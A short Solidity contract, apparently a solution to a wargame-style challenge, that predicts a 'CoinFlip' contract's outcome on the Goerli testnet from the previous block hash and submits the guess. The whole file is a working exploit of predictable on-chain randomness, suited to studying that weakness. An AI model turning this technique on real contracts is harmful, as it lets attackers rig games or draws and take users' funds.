// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract PlayCoinFlip {
    // Address of CoinFlip on Goerli
    address coinFlip = 0x7a3b65cac6467aA1699e56302412058BC4526D57;

    // Emit for response of play'ing
    event Response(bool success, bytes data);

    // Re-create process by which CoinFlip 'flips' a coin
    function guess() public view returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        // blockValue is divided by 2**255 which is the same as a bit-shift
        return (blockValue >> 255) == 1 ? true : false;
    }

    // Generate a guess and submit it to CoinFlip
    function play() public {
        bool _guess = guess();

        (bool success, bytes memory data) = coinFlip.call(
            abi.encodeWithSignature("flip(bool)", _guess)
        );

        emit Response(success, data);
    }
}